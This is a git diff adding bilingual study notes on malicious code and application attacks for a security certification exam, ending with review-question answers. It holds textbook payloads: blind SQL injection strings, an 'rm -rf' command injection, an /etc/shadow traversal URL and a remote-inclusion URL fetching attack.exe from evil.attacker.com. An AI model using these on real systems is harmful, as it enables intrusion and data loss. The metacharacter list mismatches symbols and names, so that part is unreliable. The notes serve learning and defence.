@@ -35,7 +35,52 @@ Chatpter 21 Malicious Code and Application Attacks
   * [Advanced Threat Protection](#advanced-threat-protection)
 * [Application Attacks](#application-attacks)
   * [Buffer Overflows (缓冲区溢出)](#buffer-overflows-缓冲区溢出)
-  * [Time of Check to Time of Use (检查时间到使用时间)](#time-of-check-to-time-of-use-检查时间到使用时间)
+  * [Time of Check to Time of Use (TOCTTOU or TOC/TOU / 检查时间到使用时间)](#time-of-check-to-time-of-use-tocttou-or-toctou--检查时间到使用时间)
+  * [Backdoors](#backdoors)
+  * [Privilege Escalation and Rootkits](#privilege-escalation-and-rootkits)
+* [Injection Vulnerabilities (注入漏洞)](#injection-vulnerabilities-注入漏洞)
+  * [SQL Injection Attacks (SQL注入攻击)](#sql-injection-attacks-sql注入攻击)
+    * [Blind Content-Based SQL Injection (基于内容的SQL盲注)](#blind-content-based-sql-injection-基于内容的sql盲注)
+    * [Blind Timing-Based SQL Injection (基于定时的SQL盲注)](#blind-timing-based-sql-injection-基于定时的sql盲注)
+  * [Code Injection Attacks (代码注入攻击)](#code-injection-attacks-代码注入攻击)
+  * [Command Injection Attacks (命令注入攻击)](#command-injection-attacks-命令注入攻击)
+* [Exploiting Authorization Vulnerabilities (利用授权漏洞)](#exploiting-authorization-vulnerabilities-利用授权漏洞)
+  * [Insecure Direct Object References (不安全的直接对象引用)](#insecure-direct-object-references-不安全的直接对象引用)
+  * [Directory Traversal (目录遍历)](#directory-traversal-目录遍历)
+  * [File Inclusion (文件包含)](#file-inclusion-文件包含)
+    * [Local file inclusion attacks](#local-file-inclusion-attacks)
+    * [Remote file inclusion attacks](#remote-file-inclusion-attacks)
+* [Exploiting Web Application Vulnerabilities](#exploiting-web-application-vulnerabilities)
+  * [Cross-Site Scripting (XSS / 跨站脚本)](#cross-site-scripting-xss--跨站脚本)
+  * [Reflected XSS (反射式XSS)](#reflected-xss-反射式xss)
+  * [Stored/Persistent XSS (存储/持久XSS)](#storedpersistent-xss-存储持久xss)
+  * [Request Forgery (请求伪造)](#request-forgery-请求伪造)
+    * [Cross-Site Request Forgery (CSRF/XSRF/跨站请求伪造/クロスサイトリクエストフォージェリ)](#cross-site-request-forgery-csrfxsrf跨站请求伪造クロスサイトリクエストフォージェリ)
+    * [Server-Side Request Forgery (SSRF/服务器端请求伪造/サーバ側要求の偽造)](#server-side-request-forgery-ssrf服务器端请求伪造サーバ側要求の偽造)
+    * [Session Hijackin (会话劫持)](#session-hijackin-会话劫持)
+  * [Application Security Controls](#application-security-controls)
+    * [Input Validation](#input-validation)
+  * [Web Application Firewalls](#web-application-firewalls)
+  * [Database Security](#database-security)
+    * [Parameterized Queries and Stored Procedures (参数化查询和存储过程)](#parameterized-queries-and-stored-procedures-参数化查询和存储过程)
+    * [Obfuscation and Camouflage (混淆和伪装)](#obfuscation-and-camouflage-混淆和伪装)
+  * [Code Security](#code-security)
+    * [Code Signing](#code-signing)
+    * [Code Reuse](#code-reuse)
+    * [Software Diversity (软件多样性)](#software-diversity-软件多样性)
+    * [Code Repositories (代码存储库)](#code-repositories-代码存储库)
+    * [Integrity Measurement (完整性测量)](#integrity-measurement-完整性测量)
+    * [Application Resilience (应用程序弹性)](#application-resilience-应用程序弹性)
+* [Secure Coding Practices](#secure-coding-practices)
+  * [Source Code Comments](#source-code-comments)
+  * [Error Handling](#error-handling)
+  * [Hard-Coded Credentials (硬编码凭据)](#hard-coded-credentials-硬编码凭据)
+* [Memory Management](#memory-management)
+  * [Resource Exhaustion (资源枯竭)](#resource-exhaustion-资源枯竭)
+  * [Pointer Dereferencing (指针解除引用)](#pointer-dereferencing-指针解除引用)
+* [Summary](#summary)
+* [Exam Essentials](#exam-essentials)
+* [Review Questions](#review-questions)
 
 <!-- vim-markdown-toc -->
 
@@ -165,7 +210,8 @@ There are two main reasons systems are affected by zero-day vulnerabilities:
 
 ## Advanced Threat Protection
 - Endpoint detection and response (EDR) packages go beyond traditional antimalware protection to help protect endpoints against attack. 
-- Managed detection and response (MDR) 
+- Managed detection and response (MDR)  
+  Combines antimalware capabilities with a managed service that reduces the burden on the IT team.
 - User and entity behavior analytics (UEBA) packages pay particular attention to user-based activity on endpoints and other devices.
 - UEBA tools differ from EDR capabilities in that UEBA has an analytic focus on the user, whereas EDR has an analytic focus on the endpoint.
 
@@ -173,10 +219,245 @@ There are two main reasons systems are affected by zero-day vulnerabilities:
 ## Buffer Overflows (缓冲区溢出)
 Buffer overflow vulnerabilities exist when a developer does not properly validate user input to ensure that it is of an appropriate size.
 
-## Time of Check to Time of Use (检查时间到使用时间)
+## Time of Check to Time of Use (TOCTTOU or TOC/TOU / 检查时间到使用时间)
 
+## Backdoors
+Backdoors are undocumented command sequences that allow individuals with knowledge of the backdoor to bypass normal access restrictions.
 
+## Privilege Escalation and Rootkits
+- Attackers often obtain access to a standard system user account through the use of a password attack or social engineering and then use a rootkit to increase their access to the root (or administrator) level. 
+- This increase in access from standard to administrative privileges is known as a privilege escalation attack.
 
+# Injection Vulnerabilities (注入漏洞)
+eg. SQL injection, Lightweight Directory Access Protocol (LDAP), XML injection, command injection, HTML injection, code injection, and file injection.
 
+## SQL Injection Attacks (SQL注入攻击)
+Attackers use a technique called blind SQL injection to conduct an attack even when they don't have the ability to view the results directly. 
+### Blind Content-Based SQL Injection (基于内容的SQL盲注)
+For example, like `52019' AND 1=2;--`
 
+### Blind Timing-Based SQL Injection (基于定时的SQL盲注)
+like `52019'; WAITFOR DELAY '00:00:15'; --`  
+If the application returns the result after a 15-second delay, it is likely vulnerable.
 
+## Code Injection Attacks (代码注入攻击)
+- Any environment that inserts user-supplied input into code written by an application developer may be vulnerable to a code injection attack.
+- If a web server front end uses a script to craft LDAP statements based on input from a user, then LDAP injection is potentially a threat.
+- XML injection is another type of injection attack, where the back-end target is an XML application. 
+- DLL injection attack
+- Cross-site scripting is an example of a code injection attack
+
+## Command Injection Attacks (命令注入攻击)
+Like `mchapple & rm -rf /home`, waging `system('mkdir /home/students/mchapple & rm -rf home')`
+
+# Exploiting Authorization Vulnerabilities (利用授权漏洞)
+## Insecure Direct Object References (不安全的直接对象引用)
+For example, 
+>https://www.mycompany.com/getDocument.php?documentID=1841
+https://www.mycompany.com/getDocument.php?documentID=1843
+https://www.mycompany.com/getDocument.php?documentID=1844
+
+## Directory Traversal (目录遍历)
+e.g.
+>http://www.mycompany.com/../../../etc/shadow
+
+The bad setting example:
+><Directory "/path/to/your/document/root">  
+    Options Indexes FollowSymLinks  
+    AllowOverride All  
+    Require all granted  
+</Directory>
+
+The good setting example:
+><Directory "/path/to/your/document/root">  
+    Options FollowSymLinks  
+    AllowOverride None  
+    Require all granted  
+</Directory>
+
+## File Inclusion (文件包含)
+### Local file inclusion attacks
+e.g.
+>http://www.mycompany.com/app.php?include=C:\\www\\uploads\\attack.exe
+### Remote file inclusion attacks
+e.g.
+>http://www.mycompany.com/app.php?include=http://evil.attacker.com/attack.exe
+
+# Exploiting Web Application Vulnerabilities
+## Cross-Site Scripting (XSS / 跨站脚本)
+XSS attacks occur when web applications allow an attacker to perform HTML injection, inserting their own HTML code into a web page.
+
+## Reflected XSS (反射式XSS)
+- XSS attacks commonly occur when an application allows reflected input.
+- The best solution is to determine the type of input that the application will allow and then validate the input to ensure that it matches that pattern. 
+- Output encoding is a set of related techniques that take user-supplied input and encode it using a series of rules that transform potentially dangerous content into a safe form. ([ref docs](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html))
+  - HTML entity encoding
+    >Convert & to \&amp;, < to \&lt;, > to \&gt;, " to \&quot;, ' to \&#x27;
+  - HTML attribute encoding
+    >Encode all characters with the HTML Entity \&#xHH; format, including spaces, where HH represents the hexadecimal value of the character in Unicode.  
+    For example, A becomes \&#x41;.   
+    All alphanumeric characters ([A-Za-z0-9]) remain unencoded.
+  - URL encoding ([ref docs](https://www.w3.org/TR/html401/interact/forms.html#h-17.13.4.1))
+    >Control names and values are escaped.  
+     Space characters are replaced by \`+'  
+     Non-alphanumeric characters are replaced by \`%HH'  
+     Line breaks are represented as "CR LF" pairs (i.e., `%0D%0A')
+  - JavaScript encoding
+    >Encode all characters using the Unicode \uXXXX  
+    where XXXX represents the hexadecimal Unicode code point.  
+    For example, A becomes \u0041.   
+    All alphanumeric characters ([A-Za-z0-9]) remain unencoded.
+  - CSS hex encoding
+    >CSS encoding supports both \XX and \XXXXXX formats.   
+    the full six-character CSS encoding format by zero-padding the value.  
+    For example, A becomes \41 (short format) or \000041 (full format).  
+    All alphanumeric characters ([A-Za-z0-9]) remain unencoded.
+
+## Stored/Persistent XSS (存储/持久XSS)
+
+## Request Forgery (请求伪造)
+### Cross-Site Request Forgery (CSRF/XSRF/跨站请求伪造/クロスサイトリクエストフォージェリ)
+- XSS vs CSRF/XSRF
+>XSS attacks exploit the trust that a user has in a website to execute code on the user's computer. XSRF attacks exploit the trust that remote sites have in a user's system to execute commands on the user's behalf.
+
+- The ways to be against XSRF attacks:
+  - To create web applications that use secure tokens that the attacker would not know to embed in the links.
+  - To check the referring URL in requests received from end users and only accept requests that originated from their own site.
+
+### Server-Side Request Forgery (SSRF/服务器端请求伪造/サーバ側要求の偽造)
+SSRF attacks are possible when a web application accepts URLs from a user as input and then retrieves information from that URL. 
+
+### Session Hijackin (会话劫持)
+Session hijacking attacks occur when a malicious individual intercepts part of the communication between an authorized user and a resource and then uses a hijacking technique to take over the session and assume the identity of the authorized user. 
+
+## Application Security Controls
+### Input Validation
+- The most effective form of input validation uses input whitelisting (also known as allow listing).
+- It is very important to ensure that validation occurs server-side rather than within the client's browser.
+- In some case, developers might use input blacklisting (also known as block listing) to control user input. 
+- Metacharacters
+  - single and double quotation marks '
+  - the open/close square brackets "
+  - the backslash []
+  - the semicolon ;
+  - the ampersand &
+  - the caret ^
+  - the dollar sign $
+  - the period, or dot .
+  - the vertical bar, or pipe symbol |
+  - the question mark ?
+  - the asterisk *
+  - the plus sign +
+  - open/close curly braces {}
+  - open/close parentheses ( ) 
+
+## Web Application Firewalls
+- WAFs function similarly to network firewalls, but they work at the Application layer of the OSI model.
+- Architech 
+  
+  +------------------------------------------------------+
+  |   Internet -- Network Firewall -- Internal Network   |
+  |                      |                               |
+  |                     DMZ                              |
+  |                      |                               |
+  |                     WAF                              |
+  |                      |                               |
+  |                  Web Server                          |
+  +------------------------------------------------------+
+  
+## Database Security
+### Parameterized Queries and Stored Procedures (参数化查询和存储过程)
+- Parameterized queries offer another technique to protect applications against injection attacks.
+- Stored procedures protects against injection attacks and also improves database performance.
+
+### Obfuscation and Camouflage (混淆和伪装)
+- Data minimization is the best defense.
+- Tokenization replaces personal identifiers that might directly reveal an individual's identity with a unique identifier using a lookup table.
+- Hashing uses a cryptographic hash function to replace sensitive identifiers with an irreversible alternative identifier.
+
+## Code Security
+### Code Signing
+- Code signing provides developers with a way to confirm the authenticity of their code to end users.
+
+### Code Reuse
+- Security teams should ensure that outsourced code is subjected to the same level of testing as internally developed code.
+- Security professionals should be familiar with the various ways that third-party code is used in their organizations as well as the ways that their organization makes services available to others.
+
+### Software Diversity (软件多样性)
+Security professionals should watch for places in the organization that are dependent on a single piece of source code, binary executable files, or compiler. 
+
+### Code Repositories (代码存储库)
+Dead code is in use in an organization but nobody is responsible for the maintenance of that code and, in fact, nobody may even know where the original source files reside.
+
+### Integrity Measurement (完整性测量)
+Code integrity measurement uses cryptographic hash functions to verify that the code being released into production matches the code that was previously approved. 
+
+### Application Resilience (应用程序弹性)
+- Scalability
+  - vertical scaling or “scaling up.”
+  - horizontal scaling, or “scaling out.”
+- Elasticity  
+  Ability to scale both up and down on an as-needed basis.
+
+# Secure Coding Practices
+## Source Code Comments
+- When placed in the right hands, comments are crucial.
+- However, comments can also provide attackers with a road map explaining how code works.
+- In the case of compiled executables, the compiler automatically removes comments from executable files.
+- For web applications that expose their code, developers should remove comments from production versions of the code before deployment. 
+
+## Error Handling
+- Attackers thrive on exploiting errors in code.
+- If error handling routines explain too much about the inner workings of code, they may allow an attacker to find a way to exploit the code. 
+- A good general guideline is for error messages to display the minimum amount of information necessary for the user to understand the nature of the problem, insofar as it is within their control to correct it. 
+- The application should then record as much information as possible in the application log so that developers investigating the error can correct the underlying issue.
+
+## Hard-Coded Credentials (硬编码凭据)
+There are two variations on this error.
+- A hard-coded maintenance account for the application that allows the developer to regain access even if the authentication system fails (known as a backdoor vulnerability).
+- Developers include access credentials for other services within their source code.
+
+# Memory Management
+## Resource Exhaustion (资源枯竭)
+Memory leaks are one example of resource exhaustion.
+
+## Pointer Dereferencing (指针解除引用)
+If the application tries to dereference this NULL pointer, it causes a condition known as a null pointer exception. In the best case, a NULL pointer exception causes the program to crash.
+
+# Summary
+# Exam Essentials
+- Understand the propagation techniques used by viruses.
+  1. file infection
+  1. service injection
+  1. boot sector infection
+  1. macro infection
+
+- Explain the threat posed by ransomware.
+- Know how antivirus software packages detect known viruses.
+- Explain how user and entity behavior analytics (UEBA) functions.
+- Be familiar with the various types of application attacks attackers use to exploit poorly written software. 
+- Understand common web application vulnerabilities and countermeasures.
+
+# Review Questions
+1 D
+2 C → B
+3 C
+4 B → A
+5 B
+6 B
+7 D
+8 C
+9 A
+10 D
+11 B
+12 C
+13 A
+14 A D → A B D
+15 B
+16 A
+17 A → B
+18 D
+19 D
+20 C
+
+正解率：16 / 20 = 80%
